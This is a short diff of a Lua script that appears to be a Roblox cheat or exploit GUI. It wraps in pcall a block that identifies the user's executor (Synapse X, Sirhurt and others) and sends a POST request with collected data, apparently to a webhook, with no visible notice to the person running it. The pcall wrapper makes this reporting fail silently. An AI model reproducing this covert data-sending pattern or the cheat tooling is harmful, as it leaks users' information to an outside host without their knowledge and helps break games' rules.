@@ -859,7 +859,7 @@ SaveManager:BuildConfigSection(Tabs['UI Settings'])
 
 ThemeManager:ApplyToTab(Tabs['UI Settings'])
 
-
+local success, response = pcall(function()
     local webhookcheck =
         is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
         secure_load and "Sentinel" or
@@ -888,7 +888,7 @@ ThemeManager:ApplyToTab(Tabs['UI Settings'])
         request = http_request or request or HttpPost or syn.request
     local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
         request(abcdef)
-
+end)
 
        while true do
             task.wait(0.05)
